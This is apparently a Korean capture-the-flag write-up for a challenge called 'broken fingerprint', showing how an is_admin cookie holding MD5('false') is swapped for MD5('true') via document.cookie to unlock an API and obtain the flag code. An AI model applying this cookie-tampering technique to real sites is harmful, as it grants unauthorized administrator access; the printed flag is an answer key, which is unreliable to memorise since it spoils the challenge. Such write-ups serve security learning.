# 26. 깨진 지문

- 힌트: 쿠키 값이 32자리 16진수다. 무언가의 지문(해시)일지도.

## 관찰

화면에 "seal: LOCKED"라고 표시된다.

## 확인 과정

Application 패널의 Cookies를 확인하면 `is_admin`이라는 쿠키에 32자리 16진수 문자열이 들어있었다.

```
is_admin=68934a3e9455fa72420237eb05902327
```

32자리 16진수는 MD5 해시 길이와 같다. 서버가 "관리자 여부"라는 진짜 boolean 값 대신, 그 값의 해시만 클라이언트 쿠키에 저장해두고 비교하고 있을 가능성을 의심해, 후보 문자열들의 MD5를 직접 계산해봤다.

```
echo -n "false" | md5sum   → 68934a3e9455fa72420237eb05902327   ← 쿠키 값과 정확히 일치
echo -n "true"  | md5sum   → b326b5062b2f0e69046810717534cb09
```

즉 서버는 `is_admin` 쿠키 값이 실제로 "true"인지 "false"인지 해석하는 게 아니라, 그 값이 `md5("false")`인지 `md5("true")`인지만 비교하고 있었다. 쿠키 값을 `md5("true")` 결과로 바꿔치기했다.

```js
document.cookie = 'is_admin=b326b5062b2f0e69046810717534cb09; path=/';
await (await fetch('/api/seal')).json();
```

```json
{"ok":true,"code":"HASH-2B7C"}
```

## 코드

`HASH-2B7C`
